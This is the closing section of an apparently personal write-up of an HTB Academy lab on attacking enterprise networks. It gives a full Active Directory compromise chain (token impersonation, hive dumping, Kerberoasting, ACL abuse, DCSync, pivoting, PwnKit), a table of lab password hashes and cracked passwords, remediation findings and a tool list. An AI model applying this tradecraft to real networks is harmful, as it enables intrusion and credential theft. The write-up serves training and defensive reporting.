PrintSpoofer (SeImpersonate) → SYSTEM on DEV01
  ↓
SAM/SYSTEM/SECURITY hive dump → secretsdump LOCAL
  ↓ extracted: Administrator hash, mpalledorous hash, hporter DCC2, Gr8hambino! AutoLogon
  ↓
mpalledorous NT hash cracked (1squints2) via hashcat
  ↓
hporter creds → AD enum → adum.vbs in NETLOGON (orphan password)
  ↓
Kerberoast 12 SPNs → backupjob:lucky7 cracked
  ↓
BloodHound → hporter ForceChangePassword → ssmalls
  ↓
bloodyAD password reset → ssmalls
  ↓
Department Shares\IT\Private → SQL Express Backup.ps1
  ↓ extracted: backupadm:!qazXSW@
  ↓
WinRM to MS01 as backupadm
  ↓
unattend.xml → ilfserveradm:Sys26Admin
  ↓
RDP to MS01 → Sysax local privesc → SYSTEM on MS01
  ↓
Mimikatz / secretsdump LSA Secrets → DefaultPassword: DBAilfreight1!
  ↓ paired with mssqladm via password-spray confirmation
  ↓
BloodHound → mssqladm GenericWrite → TTIMMONS → GenericAll → Server Admins → DCSync
  ↓
Targeted Kerberoast TTIMMONS via SPN injection → Repeat09 cracked
  ↓
TTIMMONS adds mssqladm to Server Admins
  ↓
DCSync → krbtgt + Administrator NT hashes → entire domain dumped
  ↓
DA hash → DC01 (evil-winrm) → drop second Ligolo agent
  ↓
Double pivot via separate TUN → 172.16.9.0/24 (management subnet)
  ↓
SSH to mngt01 with ssmallsadm key
  ↓
PwnKit (CVE-2021-4034) → root on mngt01
  ↓
🏁 Final flag captured — Module complete
```

---

## Credential Inventory

| Credential                                                                                   | Source                                                                                                                     | Notes                                                                      |
| -------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `Administrator` (DEV01 local) — NT `0e20798f695ab0d04bc138b22344cea8`                        | DEV01 SAM hive via `secretsdump LOCAL`                                                                                     | Local box admin, used for PtH back into DEV01 after drops                  |
| `mpalledorous` (DEV01 local) — NT `3bb874a52ce7b0d64ee2a82bbf3fe1cc` / cleartext `1squints2` | DEV01 SAM hive; cracked with hashcat 1000                                                                                  | Local DEV01 only, RID 1001                                                 |
| `DEV01$` machine account — NT `58d7321ddb81208129eb4058c39d785d`                             | DEV01 SAM hive via `secretsdump LOCAL`                                                                                     | Computer account, useful for silver tickets                                |
| `INLANEFREIGHT\hporter` — `Gr8hambino!`                                                      | LSA Secret `DefaultPassword` on DEV01 (AutoLogon residue)                                                                  | First domain credential                                                    |
| `INLANEFREIGHT\hporter` — DCC2 `$DCC2$10240#hporter#f7d7bba128ca183106b8a3b3de5924bc`        | Cached domain logon hash from DEV01 SECURITY hive                                                                          | Same user; not cracked since plaintext was in LSA Secret                   |
| `account@inlanefreight.local` — `L337^p@$$w0rD`                                              | Hardcoded in `adum.vbs` (NETLOGON share)                                                                                   | Orphan — username field was a placeholder                                  |
| `INLANEFREIGHT\backupjob` — `lucky7`                                                         | Kerberoast (1 of 12 SPN hashes via `GetUserSPNs -request`), cracked with hashcat 13100 + rockyou                           | Service account                                                            |
| `INLANEFREIGHT\ssmalls` — `Str0ngpass86!`                                                    | Password reset via bloodyAD using `hporter`'s ForceChangePassword (BloodHound finding)                                     | I set this; original password unknown                                      |
| `INLANEFREIGHT\backupadm` — `!qazXSW@`                                                       | Hardcoded in `SQL Express Backup.ps1` (Department Shares\IT\Private, accessible as ssmalls)                                | Keyboard walk password                                                     |
| `ilfserveradm` (MS01 local) — `Sys26Admin`                                                   | `C:\panther\unattend.xml` on MS01 (read after WinRM as backupadm)                                                          | Local to MS01                                                              |
| `INLANEFREIGHT\mssqladm` — `DBAilfreight1!`                                                  | `secretsdump LOCAL` on MS01 SECURITY hive (`DefaultPassword` after Sysax → SYSTEM)                                          | Username derived by spraying SPN-list against the auth result; `DefaultUserName` registry key was empty |
| `MS01$` machine account — NT `7fd1e8a146a95b351ffc5af3b9520bb5`                              | LSA Secrets on MS01                                                                                                        | Computer account                                                           |
| `INLANEFREIGHT\TTIMMONS` — `Repeat09`                                                        | Targeted Kerberoast: bloodyAD added SPN to TTIMMONS via mssqladm's GenericWrite, requested TGS, cracked with hashcat 13100 | Mid-chain pivot                                                            |
| `INLANEFREIGHT\Administrator` — NT `fd1f7e5564060258ea787ddbb6e6afa2`                        | DCSync as mssqladm (after adding to Server Admins which had GetChanges*)                                                   | Domain Admin                                                               |
| `krbtgt` — NT `b9362dfa5abf924b0d172b8c49ab58ac`                                             | DCSync as mssqladm, same step                                                                                              | Golden Ticket capability                                                   |
| Full NTDS dump (~3000 NT hashes)                                                             | DCSync `-just-dc` as mssqladm                                                                                              | Saved in `/tmp/loot/ntds_dump.ntds`                                        |
| `ssmallsadm` SSH private key                                                                 | Found during post-DA enumeration on DC                                                                                     | Used to SSH to mngt01 in the management subnet                             |
| Root on `mngt01`                                                                             | CVE-2021-4034 PwnKit exploit (vulnerable polkit)                                                                           | Final box ownership                                                        |

---

## Findings & Lessons Learned

### Root-cause findings (engagement-report material)

1. **NETLOGON-readable scripts containing credentials.** `adum.vbs` was world-readable to any authenticated domain user. NETLOGON should never contain plaintext credentials of any kind.
2. **Configuration files with hardcoded credentials in shared folders.** `SQL Express Backup.ps1` lived in `Department Shares\IT\Private\Development` — accessible to anyone in the IT group. `unattend.xml` was left in `C:\panther\` after Windows OOBE setup completed. `web.config` on the NFS export contained SA-level SQL connection strings.
3. **AutoLogon residue in LSA Secrets.** Both DEV01 and MS01 had cleartext `DefaultPassword` LSA Secrets recoverable from the SECURITY hive. AutoLogon is convenient but every AutoLogon configuration leaves the cleartext password recoverable as SYSTEM.
4. **Weak service-account passwords.** `lucky7`, `Repeat09`, `1squints2`, `!qazXSW@`, `Sys26Admin`, `Gr8hambino!`, `DBAilfreight1!` all fell to `rockyou.txt + best64.rule`. Service accounts especially need long, randomly-generated passwords because they cannot be rotated by interactive users.
5. **ACL nesting on the Server Admins group.** `Server Admins` held `GetChanges`, `GetChanges-All`, and `GetChanges-In-Filtered-Set` rights on the domain object — the DCSync triad. `TTIMMONS` held `GenericAll` over `Server Admins`. `mssqladm` held `GenericWrite` over `TTIMMONS`. Three nested rights between a single low-privilege service account and full domain compromise.
6. **No LAPS deployment.** Local Administrator passwords were potentially reused (or at least testable without lockout) across the subnet.
7. **Missing patch on management host.** `policykit-1` on `mngt01` was below `0.105-26ubuntu1.2`, leaving CVE-2021-4034 (PwnKit) exploitable.

### Engagement-report summary sentence

> Excessive replication rights granted to the *Server Admins* group, combined with weak ACL boundaries on group membership (TTIMMONS held GenericAll over Server Admins and mssqladm held GenericWrite over TTIMMONS), enabled full domain credential extraction via DCSync from a starting position of one low-privilege user credential recovered from an AutoLogon LSA Secret.

### Patterns / Findings Summary

- **Three credentials came from configuration files in shares** (`adum.vbs`, `SQL Express Backup.ps1`, `unattend.xml`) — single biggest finding category
- **Two came from AutoLogon LSA Secrets residue** — same root cause on DEV01 (hporter) and MS01 (mssqladm)
- **One ACL chain ended the domain**: mssqladm → TTIMMONS → Server Admins → DCSync — illustrates compounding nested rights
- **Password quality through-line** — `lucky7`, `Repeat09`, `1squints2`, `!qazXSW@`, `Sys26Admin`, `Gr8hambino!` all fell to rockyou + basic rules

### Personal lessons

- **The walkthrough is a guide, not a script.** Several places the lab diverged from HTB's writeup (`DefaultUserName` registry key was empty, Ligolo flapped under load, the listener configurations needed adjustment). Reasoning through alternatives is the actual skill — writeups are always a few iterations behind reality.
- **ACL chains are the real AD attack surface.** The `mssqladm → TTIMMONS → Server Admins → DCSync` path is invisible to manual enumeration. BloodHound's value is making invisible relationships visible.
- **Run BloodHound early, run it always.** Once any domain credential is in hand, BloodHound is essentially mandatory. ~60 seconds of collection saves hours of dead-end manual queries.
- **Ligolo > proxychains for whole-subnet work.** Whole-subnet routing through one TUN interface beats wrapping every command in proxychains. The exception is single-port persistence — for that, SSH `-L` local forwarding is more stable than Ligolo under load.
- **Quieter tradecraft would matter in a real engagement.** Password resets and group membership additions are loud and would be caught instantly outside a lab. AS-REP roasting, Shadow Credentials via msDS-KeyCredentialLink, and silver/golden tickets are the quieter equivalents for the same outcomes.

### Tooling reference

```
Recon         : nmap, dig, ffuf, wpscan
Pivot         : Ligolo-ng (promptnova / promptnova2 TUNs), listener_add
Web exploit   : Burp Suite, sqlmap, socat, manual XXE/XSS/SSRF payloads
Initial Linux : Hydra, GTFOBins openssl
File hunting  : NFS mount, smbclient, crackmapexec spider_plus
AD enum       : impacket-GetADUsers, impacket-GetUserSPNs, bloodyAD, BloodHound CE
AD attacks    : bloodyAD set/add/remove, impacket-secretsdump (LOCAL & -just-dc)
Windows shells: evil-winrm, xfreerdp, impacket-mssqlclient, impacket-psexec
Privesc       : PrintSpoofer (SeImpersonate), Sysax scheduled task as SYSTEM
Cred dump     : reg save, impacket-secretsdump LOCAL, Mimikatz lsadump::secrets
Cracking      : hashcat -m 1000 / 13100 / 18200 / 2100 + rockyou + best64.rule
Linux privesc : pkexec CVE-2021-4034 (PwnKit, joeammond Python variant)
```

---

*Module: HTB Academy — Attacking Enterprise Networks*
*Status: Completed — all flags captured, full domain compromise + management subnet root*
